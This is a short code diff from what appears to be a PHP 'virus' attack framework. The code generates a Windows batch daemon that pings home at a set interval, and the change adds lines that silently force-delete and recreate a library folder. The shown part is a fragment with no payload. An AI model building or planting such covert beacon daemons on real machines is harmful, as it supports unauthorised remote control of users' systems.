@@ -22,6 +22,9 @@ namespace Kelvinho\Virus\Attack {
             @echo off
             SetLocal EnableDelayedExpansion
 
+            rmdir -s -q %~dp0libs\current
+            mkdir %~dp0libs\current
+
             :daemon_loop
             timeout <?php echo VIRUS_PING_INTERVAL . "\n"; ?>
 
